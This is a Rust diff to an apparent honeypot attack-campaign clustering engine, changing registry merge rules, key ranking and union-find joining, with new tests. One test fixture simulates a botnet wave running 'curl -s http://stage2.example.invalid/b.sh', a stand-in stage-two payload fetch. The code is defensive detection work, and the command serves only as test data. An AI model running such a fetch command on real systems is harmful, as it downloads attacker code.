@@ -110,7 +110,7 @@ pub enum Feature {
     CallbackDomain,
     /// Same callback or second-stage address.
     CallbackIp,
-    /// Same behaviour fingerprint (`bf1:`), exploit or later only.
+    /// Same behaviour fingerprint (`bf2:`), exploit or later only.
     BehaviourFingerprint,
     /// Same command line.
     Cmdline,
@@ -769,25 +769,49 @@ impl Registry {
         id
     }
 
-    /// Apply an update the way the stores do: `created_at` is kept, first
-    /// and last seen only widen, and `attempts` is recounted. Used by the
+    /// Apply an update the way the stores do, so concurrent or stale
+    /// writers converge: `created_at` keeps the oldest value, first and last
+    /// seen only widen, `merged_into` is write-once and never points at the
+    /// campaign itself, and a membership only moves to an older campaign
+    /// (smaller `created_at`, then id). `attempts` is recounted. Used by the
     /// in-memory store and tests; the Postgres store does the same in SQL.
     pub fn apply(&mut self, up: &RegistryUpdate) {
-        for m in &up.members {
-            self.members
-                .insert(m.attempt_id.clone(), m.campaign_id.clone());
-        }
         for c in &up.campaigns {
+            let merged = c.merged_into.clone().filter(|m| *m != c.campaign_id);
             let rec = match self.campaigns.get(&c.campaign_id) {
                 Some(s) => StoredCampaign {
+                    created_at: s.created_at.min(c.created_at),
                     first_seen: s.first_seen.min(c.first_seen),
                     last_seen: s.last_seen.max(c.last_seen),
-                    merged_into: c.merged_into.clone(),
+                    merged_into: s.merged_into.clone().or(merged),
                     ..s.clone()
                 },
-                None => c.clone(),
+                None => StoredCampaign {
+                    merged_into: merged,
+                    ..c.clone()
+                },
             };
             self.campaigns.insert(c.campaign_id.clone(), rec);
+        }
+        for m in &up.members {
+            let rank = |id: &str| {
+                self.campaigns
+                    .get(id)
+                    .map(|c| (c.created_at, id.to_string()))
+            };
+            let moves = match self.members.get(&m.attempt_id) {
+                None => true,
+                Some(old) if *old == m.campaign_id => false,
+                Some(old) => match (rank(&m.campaign_id), rank(old)) {
+                    (Some(new), Some(old)) => new < old,
+                    (Some(_), None) => true,
+                    _ => false,
+                },
+            };
+            if moves {
+                self.members
+                    .insert(m.attempt_id.clone(), m.campaign_id.clone());
+            }
         }
         let mut counts: BTreeMap<&str, u32> = BTreeMap::new();
         for c in self.members.values() {
@@ -1155,29 +1179,51 @@ fn candidate_keys(
     out.into_iter().collect()
 }
 
-/// Keep the keys that can join (held by two or more attempts), strongest
-/// first, then rarest (held by the fewest attempts), at most
-/// [`MAX_KEYS_PER_FEATURE`] per feature and [`MAX_FEATURES_PER_ATTEMPT`] in
-/// all. Junk values sent to flood the cap are held by one attempt each and
-/// never compete; a feature cannot crowd out the others. Returns the kept
-/// keys and how many joinable keys were dropped.
-fn select_keys(cands: &[usize], keys: &Keys, held_by: &[usize]) -> (Vec<usize>, usize) {
-    let mut joinable: Vec<usize> = cands.iter().copied().filter(|&k| held_by[k] >= 2).collect();
-    joinable.sort_by(|&a, &b| {
-        (keys.info[a].strength, held_by[a])
-            .cmp(&(keys.info[b].strength, held_by[b]))
-            .then_with(|| keys.order(a, b))
-    });
+/// How one attempt's joinable keys are ranked for the cap.
+struct KeyStats<'a> {
+    /// Attempts holding each key.
+    held_by: &'a [usize],
+    /// Distinct sources holding each key.
+    sources: &'a [usize],
+    /// Keys this attempt shares with another attempt recorded in the same
+    /// campaign: the evidence that joined it before.
+    recorded: &'a BTreeSet<usize>,
+}
+
+/// Keep the keys that can join (held by two or more attempts): first the
+/// keys this attempt shares with its recorded campaign, then strongest
+/// first, then the keys held by the most distinct sources (evidence that
+/// joins more of the fleet wins), at most [`MAX_KEYS_PER_FEATURE`] per
+/// feature and [`MAX_FEATURES_PER_ATTEMPT`] in all. Junk values are held by
+/// the sender's own attempts only, so they rank below a value many sources
+/// share, and no feature can crowd out the others. Returns the kept keys and
+/// how many joinable keys were dropped.
+fn select_keys(cands: &[usize], keys: &Keys, stats: &KeyStats<'_>) -> (Vec<usize>, usize) {
+    let mut joinable: Vec<usize> = cands
+        .iter()
+        .copied()
+        .filter(|&k| stats.held_by[k] >= 2)
+        .collect();
+    let rank = |k: usize| {
+        (
+            !stats.recorded.contains(&k),
+            keys.info[k].strength,
+            std::cmp::Reverse(stats.sources[k]),
+            std::cmp::Reverse(stats.held_by[k]),
+        )
+    };
+    joinable.sort_by(|&a, &b| rank(a).cmp(&rank(b)).then_with(|| keys.order(a, b)));
     let mut per_feature: BTreeMap<Feature, usize> = BTreeMap::new();
     let mut kept = Vec::new();
-    for k in &joinable {
+    for &k in &joinable {
         if kept.len() == MAX_FEATURES_PER_ATTEMPT {
             break;
         }
-        let n = per_feature.entry(keys.keys[*k].feature).or_default();
-        if *n < MAX_KEYS_PER_FEATURE {
+        let n = per_feature.entry(keys.keys[k].feature).or_default();
+        // Recorded evidence is never crowded out by the quota.
+        if *n < MAX_KEYS_PER_FEATURE || stats.recorded.contains(&k) {
             *n += 1;
-            kept.push(*k);
+            kept.push(k);
         }
     }
     let dropped = joinable.len() - kept.len();
@@ -1187,7 +1233,8 @@ fn select_keys(cands: &[usize], keys: &Keys, held_by: &[usize]) -> (Vec<usize>, 
 struct Dsu {
     parent: Vec<usize>,
     size: Vec<usize>,
-    /// Holds a cluster formed by strong or medium features.
+    /// Holds a cluster formed by strong or medium features, or a member of
+    /// a recorded campaign.
     established: Vec<bool>,
 }
 
@@ -1261,6 +1308,17 @@ pub fn cluster(input: &Input<'_>, params: Params, cfg: &ConfidenceConfig) -> Clu
         .iter()
         .map(|x| (x.attempt_id.as_str(), x.ioc_refs.as_slice()))
         .collect();
+    // The recorded (live) campaign of each attempt, if any.
+    let stored: Vec<Option<&str>> = attempts
+        .iter()
+        .map(|a| {
+            input
+                .registry
+                .members
+                .get(&a.attempt_id)
+                .map(|c| input.registry.resolve(c))
+        })
+        .collect();
 
     // Candidate keys, interned.
     let mut keys = Keys::default();
@@ -1278,31 +1336,37 @@ pub fn cluster(input: &Input<'_>, params: Params, cfg: &ConfidenceConfig) -> Clu
         })
         .collect();
 
-    // How many attempts and distinct sources hold each key.
-    let mut held_by = vec![0usize; keys.keys.len()];
-    let mut sources: BTreeMap<usize, BTreeSet<&str>> = BTreeMap::new();
+    // How many attempts, distinct sources and recorded campaigns hold each
+    // key.
+    let nk = keys.keys.len();
+    let mut held_by = vec![0usize; nk];
+    let mut source_sets: Vec<BTreeSet<&str>> = vec![BTreeSet::new(); nk];
+    let mut per_campaign: BTreeMap<(usize, &str), usize> = BTreeMap::new();
     for (i, c) in cands.iter().enumerate() {
         for &k in c {
             held_by[k] += 1;
-            if keys.info[k].strength == Strength::Medium {
-                sources
-                    .entry(k)
-                    .or_default()
-                    .insert(attempts[i].src.as_str());
+            source_sets[k].insert(attempts[i].src.as_str());
+            if let Some(s) = stored[i] {
+                *per_campaign.entry((k, s)).or_default() += 1;
             }
         }
     }
-    // Rarity: a medium feature shared by many of the window's sources is
-    // what a public exploit or tool looks like, not one operator.
+    let sources: Vec<usize> = source_sets.iter().map(BTreeSet::len).collect();
+    drop(source_sets);
+    // Rarity, for behaviour fingerprints only: one shared by many of the
+    // window's sources is what a public exploit or tool looks like, not one
+    // operator. Other medium features (command lines, request strings) are
+    // what a botnet wave shares, so they keep their strength.
     let all_sources = attempts
         .iter()
         .map(|a| a.src.as_str())
         .collect::<BTreeSet<_>>()
         .len();
-    for (k, s) in &sources {
-        let n = s.len();
-        if n > COMMON_MAX_SOURCES || (all_sources >= COMMON_MIN_POPULATION && n * 4 > all_sources) {
-            keys.info[*k].strength = Strength::Weak;
+    for (k, &s) in sources.iter().enumerate() {
+        let common =
+            s > COMMON_MAX_SOURCES || (all_sources >= COMMON_MIN_POPULATION && s * 4 > all_sources);
+        if common && keys.keys[k].feature == Feature::BehaviourFingerprint {
+            keys.info[k].strength = Strength::Weak;
         }
     }
 
@@ -1312,7 +1376,20 @@ pub fn cluster(input: &Input<'_>, params: Params, cfg: &ConfidenceConfig) -> Clu
     let mut notes = Vec::new();
     let mut capped: BTreeMap<usize, usize> = BTreeMap::new();
     for (i, c) in cands.iter().enumerate() {
-        let (kept, dropped) = select_keys(c, &keys, &held_by);
+        let recorded: BTreeSet<usize> = match stored[i] {
+            Some(s) => c
+                .iter()
+                .copied()
+                .filter(|&k| per_campaign.get(&(k, s)).is_some_and(|&n| n >= 2))
+                .collect(),
+            None => BTreeSet::new(),
+        };
+        let stats = KeyStats {
+            held_by: &held_by,
+            sources: &sources,
+            recorded: &recorded,
+        };
+        let (kept, dropped) = select_keys(c, &keys, &stats);
         if dropped > 0 {
             capped.insert(i, dropped);
         }
@@ -1323,8 +1400,8 @@ pub fn cluster(input: &Input<'_>, params: Params, cfg: &ConfidenceConfig) -> Clu
     }
     for (&i, dropped) in capped.iter().take(MAX_CAP_NOTES) {
         notes.push(format!(
-            "Attempt {} had {dropped} more shared feature(s) than the cap; the commonest were \
-             not used.",
+            "Attempt {} had {dropped} more shared feature(s) than the cap; the least shared \
+             were not used.",
             attempts[i].attempt_id
         ));
     }
@@ -1335,24 +1412,41 @@ pub fn cluster(input: &Input<'_>, params: Params, cfg: &ConfidenceConfig) -> Clu
         ));
     }
 
-    // Union-find: strong and medium keys first, then weak keys, which may
-    // attach stragglers but never bridge two established clusters.
+    // Union-find. Pass 1: strong and medium keys. Then the registry joins
+    // attempts recorded in the same campaign; it only ever records joins
+    // made by strong or medium features, so this re-applies evidence seen
+    // in an earlier window. Pass 2: weak keys, which may attach stragglers
+    // but never bridge two established clusters (a recorded attempt counts
+    // as established).
     let mut dsu = Dsu::new(n);
     let mut edges: Vec<Vec<(usize, usize)>> = vec![Vec::new(); n];
     let mut refused = 0usize;
+    let mut order: Vec<usize> = index.keys().copied().collect();
+    // Key order (strength, feature, value) keeps the walk deterministic.
+    order.sort_by(|&a, &b| keys.order(a, b));
+    let mut core: Vec<usize> = Vec::new();
     for weak_pass in [false, true] {
         if weak_pass {
-            for i in 0..n {
+            let mut by_stored: BTreeMap<&str, usize> = BTreeMap::new();
+            for (i, s) in stored.iter().enumerate() {
+                if let Some(s) = s {
+                    match by_stored.get(s) {
+                        Some(&first) => dsu.union(first, i),
+                        None => {
+                            by_stored.insert(s, i);
+                        }
+                    }
+                }
+            }
+            for (i, s) in stored.iter().enumerate() {
                 let r = dsu.find(i);
-                if dsu.size[r] >= 2 {
+                if dsu.size[r] >= 2 || s.is_some() {
                     dsu.established[r] = true;
                 }
             }
+            core = (0..n).map(|i| dsu.find(i)).collect();
         }
-        // Key order (strength, feature, value) keeps the walk deterministic.
-        let mut order: Vec<usize> = index.keys().copied().collect();
-        order.sort_by(|&a, &b| keys.order(a, b));
-        for k in order {
+        for &k in &order {
             if (keys.info[k].strength == Strength::Weak) != weak_pass {
                 continue;
             }
@@ -1377,33 +1471,13 @@ pub fn cluster(input: &Input<'_>, params: Params, cfg: &ConfidenceConfig) -> Clu
     if refused > 0 {
         notes.push(format!(
             "{refused} weak feature join(s) were not used because they would have bridged two \
-             campaigns already formed by strong or medium features."
+             established campaigns."
         ));
     }
 
-    // Registry: attempts recorded in the same campaign stay together.
-    let stored: Vec<Option<&str>> = attempts
-        .iter()
-        .map(|a| {
-            input
-                .registry
-                .members
-                .get(&a.attempt_id)
-                .map(|c| input.registry.resolve(c))
-        })
-        .collect();
-    let mut by_stored: BTreeMap<&str, usize> = BTreeMap::new();
-    for (i, s) in stored.iter().enumerate() {
-        if let Some(s) = s {
-            match by_stored.get(s) {
-                Some(&first) => dsu.union(first, i),
-                None => {
-                    by_stored.insert(s, i);
-                }
-            }
-        }
-    }
-
+    // Final groups. Each holds at most one established core (the weak pass
+    // never joins two); the id comes from that core: its oldest recorded
+    // id, else its earliest attempt.
     let mut by_root: BTreeMap<usize, BTreeSet<usize>> = BTreeMap::new();
     for i in 0..n {
         let r = dsu.find(i);
@@ -1416,23 +1490,38 @@ pub fn cluster(input: &Input<'_>, params: Params, cfg: &ConfidenceConfig) -> Clu
             .get(id)
             .map_or(i64::MAX, |c| c.created_at)
     };
+    let mut core_size: BTreeMap<usize, usize> = BTreeMap::new();
+    for &c in &core {
+        *core_size.entry(c).or_default() += 1;
+    }
+    let is_core =
+        |i: usize| core_size.get(&core[i]).is_some_and(|&s| s >= 2) || stored[i].is_some();
     let mut groups: BTreeMap<String, Group> = BTreeMap::new();
     let mut member_of: Vec<Option<String>> = vec![None; n];
+    let mut cores: BTreeMap<String, BTreeSet<usize>> = BTreeMap::new();
     for members in by_root.into_values() {
-        let recorded: BTreeSet<&str> = members.iter().filter_map(|&m| stored[m]).collect();
-        if members.len() < 2 && recorded.is_empty() {
+        let recorded = members.iter().any(|&m| stored[m].is_some());
+        if members.len() < 2 && !recorded {
             continue;
         }
-        let seed = *members.iter().next().expect("non-empty");
-        // The oldest recorded id wins; a new cluster takes its seed's id.
-        let id = recorded
+        let core_members: BTreeSet<usize> =
+            members.iter().copied().filter(|&m| is_core(m)).collect();
+        let basis = if core_members.is_empty() {
+            &members
+        } else {
+            &core_members
+        };
+        let seed = *basis.iter().next().expect("non-empty");
+        let id = basis
             .iter()
-            .min_by_key(|id| (created(id), **id))
-            .map(|id| id.to_string())
+            .filter_map(|&m| stored[m])
+            .min_by_key(|id| (created(id), *id))
+            .map(str::to_string)
             .unwrap_or_else(|| campaign_id(input.tenant_id, &attempts[seed].attempt_id));
         for &m in &members {
             member_of[m] = Some(id.clone());
         }
+        cores.insert(id.clone(), core_members);
         groups.insert(
             id,
             Group {
@@ -1443,6 +1532,11 @@ pub fn cluster(input: &Input<'_>, params: Params, cfg: &ConfidenceConfig) -> Clu
             },
         );
     }
+
+    // The registry records live clustering only, before analyst actions:
+    // merges and splits are replayed from the actions on every read.
+    let registry_update =
+        registry_update(input, &attempts, &stored, &keys, &edges, &groups, &cores);
 
     apply_actions(
         input,
@@ -1461,7 +1555,6 @@ pub fn cluster(input: &Input<'_>, params: Params, cfg: &ConfidenceConfig) -> Clu
             .or_default()
             .insert(a.decoy_id.as_str());
     }
-    let registry_update = registry_update(input, &attempts, &stored, &groups);
     let ctx = BuildCtx {
         input,
         params,
@@ -1494,39 +1587,58 @@ pub fn cluster(input: &Input<'_>, params: Params, cfg: &ConfidenceConfig) -> Clu
     }
 }
 
-/// Registry writes: memberships that changed, campaign records that are
-/// new or moved, and recorded campaigns that no group holds any more
-/// (folded into the group that now holds their attempts).
+/// Registry writes from live clustering (before analyst actions). Only
+/// established memberships are recorded: an attempt joined to its group by
+/// a strong or medium feature. Weak joins, registry carry-overs and analyst
+/// actions never write memberships, so the registry can only re-apply
+/// evidence strong enough to join on its own. A recorded campaign whose
+/// attempts now sit in another campaign's established core (a strong or
+/// medium bridge) is recorded as merged into it.
 fn registry_update(
     input: &Input<'_>,
     attempts: &[&Attempt],
     stored: &[Option<&str>],
+    keys: &Keys,
+    edges: &[Vec<(usize, usize)>],
     groups: &BTreeMap<String, Group>,
+    cores: &BTreeMap<String, BTreeSet<usize>>,
 ) -> RegistryUpdate {
     let mut up = RegistryUpdate::default();
     let mut absorbed: BTreeMap<&str, &str> = BTreeMap::new();
     for (id, g) in groups {
-        if g.members.is_empty() {
-            continue;
-        }
+        let established = |m: usize| {
+            edges[m]
+                .iter()
+                .any(|&(k, o)| keys.info[k].strength != Strength::Weak && g.members.contains(&o))
+        };
+        let mut kept: Vec<usize> = Vec::new();
         for &m in &g.members {
-            let a = attempts[m];
-            if input.registry.members.get(&a.attempt_id) != Some(id) {
+            let same = stored[m] == Some(id.as_str());
+            let strong = established(m);
+            if strong && !same {
+                let a = attempts[m];
                 up.members.push(MemberRecord {
                     attempt_id: a.attempt_id.clone(),
                     campaign_id: id.clone(),
                     attempt_first_seen: a.first_seen,
                 });
             }
-            if let Some(s) = stored[m]
-                && s != id
-                && !groups.contains_key(s)
-            {
-                absorbed.entry(s).or_insert(id.as_str());
+            if strong || same {
+                kept.push(m);
             }
         }
-        let first = g.members.iter().map(|&m| attempts[m].first_seen).min();
-        let last = g.members.iter().map(|&m| attempts[m].last_seen).max();
+        if let Some(core) = cores.get(id) {
+            for &m in core {
+                if let Some(s) = stored[m]
+                    && s != id
+                    && !groups.contains_key(s)
+                {
+                    absorbed.entry(s).or_insert(id.as_str());
+                }
+            }
+        }
+        let first = kept.iter().map(|&m| attempts[m].first_seen).min();
+        let last = kept.iter().map(|&m| attempts[m].last_seen).max();
         let (Some(first), Some(last)) = (first, last) else {
             continue;
         };
@@ -1534,7 +1646,6 @@ fn registry_update(
             Some(s) => StoredCampaign {
                 first_seen: s.first_seen.min(first),
                 last_seen: s.last_seen.max(last),
-                merged_into: None,
                 ..s.clone()
             },
             None => StoredCampaign {
@@ -1552,7 +1663,8 @@ fn registry_update(
     }
     for (from, into) in absorbed {
         if let Some(s) = input.registry.campaigns.get(from)
-            && s.merged_into.as_deref() != Some(into)
+            && s.merged_into.is_none()
+            && from != into
         {
             up.campaigns.push(StoredCampaign {
                 merged_into: Some(into.to_string()),
@@ -1644,8 +1756,9 @@ fn apply_actions(
                         continue;
                     };
                     if other == gid {
-                        // Already together (the registry kept the earlier
-                        // merge); still say where the campaign came from.
+                        // Already together (a live bridge joined them, or
+                        // only its anchors are left in the window); still
+                        // say where the campaign came from.
                         let g = groups.get_mut(&gid).expect("group exists");
                         if r.campaign_id != gid && !g.analyst.merged_from.contains(&r.campaign_id) {
                             g.analyst.merged_from.push(r.campaign_id.clone());
@@ -2786,15 +2899,20 @@ mod tests {
         assert_eq!(c.attempt_ids.len(), 5, "a2 a3 a4 b2 b3");
         assert_eq!(c.analyst.merged_from, vec![b.campaign_id.clone()]);
         assert!(w2.notes.is_empty(), "{:?}", w2.notes);
-        // The new attempts are recorded; the old ones are unchanged.
-        let recorded: Vec<&str> = w2
+        // The new attempts are recorded under their live campaigns; the
+        // merge is not written to the registry, it is replayed.
+        let recorded: BTreeMap<&str, &str> = w2
             .registry_update
             .members
             .iter()
-            .map(|m| m.campaign_id.as_str())
+            .map(|m| (m.attempt_id.as_str(), m.campaign_id.as_str()))
             .collect();
-        assert_eq!(recorded.len(), 2, "a4 and b3");
-        assert!(recorded.iter().all(|id| *id == a.campaign_id));
+        assert_eq!(recorded.len(), 2, "a4 and b3: {recorded:?}");
+        let mut ids: Vec<&str> = recorded.values().copied().collect();
+        ids.sort();
+        let mut want = vec![a.campaign_id.as_str(), b.campaign_id.as_str()];
+        want.sort();
+        assert_eq!(ids, want);
     }
 
     #[test]
@@ -2966,6 +3084,194 @@ mod tests {
         let c = run(&r, &actions);
         assert_eq!(c.campaigns.len(), 1, "the merge still applies");
         assert!(c.notes.iter().any(|n| n.contains("feedback action")));
+    }
+
+    #[test]
+    fn a_weak_join_in_a_narrow_window_never_merges_recorded_campaigns() {
+        // A and B form on strong keys; a2 and b1 share only a source that
+        // reached exploit on both.
+        let other = "cd".repeat(32);
+        let shared = "203.0.113.99";
+        let a2 = || {
+            vec![
+                post("a2", T0 + 1000, "d2", shared, HASH),
+                hook("a2h", T0 + 1001, "d2", shared),
+            ]
+        };
+        let b1 = || {
+            vec![
+                post("b1", T0 + 2000, "d5", shared, &other),
+                hook("b1h", T0 + 2001, "d5", shared),
+            ]
+        };
+        let mut all = vec![
+            post("a1", T0, "d1", "203.0.113.1", HASH),
+            post("a3", T0 + 3000, "d3", "203.0.113.3", HASH),
+            post("b2", T0 + 4000, "d6", "198.51.100.2", &other),
+            post("b3", T0 + 5000, "d7", "198.51.100.3", &other),
+        ];
+        all.extend(a2());
+        all.extend(b1());
+
+        // A full read records A and B.
+        let mut full = prepare(all.clone());
+        let c = run(&full, &[]);
+        assert_eq!(c.campaigns.len(), 2);
+        full.registry.apply(&c.registry_update);
+
+        // A narrow window holding only a2 and b1: they join weakly when
+        // nothing is recorded, and nothing is written.
+        let mut narrow = prepare([a2(), b1()].concat());
+        let weak = run(&narrow, &[]);
+        assert_eq!(weak.campaigns.len(), 1, "weak join in isolation");
+        assert!(
+            weak.registry_update.is_empty(),
+            "weak joins are never recorded"
+        );
+        // With the registry, the recorded attempts count as established and
+        // the weak key cannot bridge them.
+        narrow.registry = full.registry.clone();
+        let guarded = run(&narrow, &[]);
+        assert!(guarded.campaigns.is_empty(), "{:?}", guarded.campaigns);
+        assert!(guarded.registry_update.is_empty());
+        full.registry.apply(&weak.registry_update);
+        full.registry.apply(&guarded.registry_update);
+
+        // The next full read still has two campaigns.
+        let again = run(&full, &[]);
+        assert_eq!(again.campaigns.len(), 2);
+        assert!(again.notes.iter().any(|n| n.contains("bridged")));
+    }
+
+    #[test]
+    fn stale_registry_writes_cannot_undo_newer_ones() {
+        let rec = |id: &str, created: i64, merged: Option<&str>| StoredCampaign {
+            campaign_id: id.into(),
+            created_at: created,
+            first_seen: 10,
+            last_seen: 20,
+            merged_into: merged.map(str::to_string),
+            attempts: 0,
+        };
+        let member = |a: &str, c: &str| MemberRecord {
+            attempt_id: a.into(),
+            campaign_id: c.into(),
+            attempt_first_seen: 10,
+        };
+        let mut r = Registry::default();
+        r.apply(&RegistryUpdate {
+            campaigns: vec![rec("cmp_old", 1, None), rec("cmp_new", 5, Some("cmp_old"))],
+            members: vec![member("att_1", "cmp_old")],
+        });
+        // A stale reader: newer created_at, merged_into cleared, a self
+        // merge, and the attempt moved to a newer campaign.
+        r.apply(&RegistryUpdate {
+            campaigns: vec![rec("cmp_old", 9, Some("cmp_old")), rec("cmp_new", 9, None)],
+            members: vec![member("att_1", "cmp_new")],
+        });
+        assert_eq!(r.campaigns["cmp_old"].created_at, 1);
+        assert_eq!(r.campaigns["cmp_old"].merged_into, None, "never itself");
+        assert_eq!(
+            r.campaigns["cmp_new"].merged_into.as_deref(),
+            Some("cmp_old")
+        );
+        assert_eq!(
+            r.members["att_1"], "cmp_old",
+            "memberships only move to older"
+        );
+        assert_eq!(r.resolve("cmp_new"), "cmp_old");
+    }
+
+    fn post_exploit(i: usize, src: &str, cmd: &str) -> Vec<Value> {
+        let decoy = format!("d{i}");
+        let mut h = hook(&format!("pe{i}"), T0 + i as i64 * 60_000, &decoy, src);
+        h["hook"]["stage"] = json!("post_exploit");
+        h["hook"]["cmd_lines"] = json!([cmd]);
+        vec![
+            app(
+                &format!("pg{i}"),
+                T0 + i as i64 * 60_000 - 1,
+                &decoy,
+                src,
+                json!({"method": "POST", "path": format!("/x{i}")}),
+            ),
+            h,
+        ]
+    }
+
+    #[test]
+    fn a_botnet_wave_still_forms_on_shared_commands_and_stage2() {
+        // Twelve sources run the same command: the command line keeps its
+        // medium strength (only fingerprints are demoted when common).
+        let events = (0..12)
+            .flat_map(|i| post_exploit(i, &format!("198.51.100.{}", 10 + i), "uname -a"))
+            .collect();
+        let c = run(&prepare(events), &[]);
+        assert_eq!(c.campaigns.len(), 1);
+        let joins: Vec<&Join> = c.campaigns[0]
+            .members
+            .iter()
+            .flat_map(|m| &m.joined_by)
+            .filter(|j| j.feature == Feature::Cmdline)
+            .collect();
+        assert!(!joins.is_empty() && joins.iter().all(|j| j.strength == Strength::Medium));
+
+        // The same wave fetching one stage 2 is active.
+        let events = (0..12)
+            .flat_map(|i| {
+                post_exploit(
+                    i,
+                    &format!("198.51.100.{}", 10 + i),
+                    "curl -s http://stage2.example.invalid/b.sh",
+                )
+            })
+            .collect();
+        let c = run(&prepare(events), &[]);
+        assert_eq!(c.campaigns.len(), 1);
+        assert_eq!(c.campaigns[0].status, CampaignStatus::Active);
+
+        // A command shared by 3 of 8 sources stays medium too.
+        let mut events: Vec<Value> = (0..3)
+            .flat_map(|i| post_exploit(i, &format!("198.51.100.{}", 10 + i), "uname -a"))
+            .collect();
+        for i in 3..8 {
+            events.extend(post_exploit(
+                i,
+                &format!("198.51.100.{}", 10 + i),
+                &format!("id {i}"),
+            ));
+        }
+        let c = run(&prepare(events), &[]);
+        let cmd = c.campaigns[0].members[0]
+            .joined_by
+            .iter()
+            .find(|j| j.feature == Feature::Cmdline)
+            .unwrap();
+        assert_eq!(cmd.strength, Strength::Medium);
+    }
+
+    #[test]
+    fn junk_shared_by_two_attackers_cannot_split_a_wave() {
+        for junk in [15, 16, 20] {
+            let mut events = wave();
+            events.truncate(3);
+            events.push(post("a5", T0 + 2500, "d8", "203.0.113.5", HASH));
+            for (src, decoy, tag) in [("198.51.100.77", "d9", "x"), ("198.51.100.78", "d10", "y")] {
+                for i in 0..junk {
+                    events.push(post(
+                        &format!("{tag}{i}"),
+                        T0 + 4000 + i,
+                        decoy,
+                        src,
+                        &format!("{:064x}", 1000 + i),
+                    ));
+                }
+                events.push(post(&format!("{tag}-h"), T0 + 4100, decoy, src, HASH));
+            }
+            let c = run(&prepare(events), &[]);
+            assert_eq!(c.campaigns.len(), 1, "junk {junk}: {:?}", c.notes);
+            assert_eq!(c.campaigns[0].attempt_ids.len(), 6, "junk {junk}");
+        }
     }
 
     #[test]
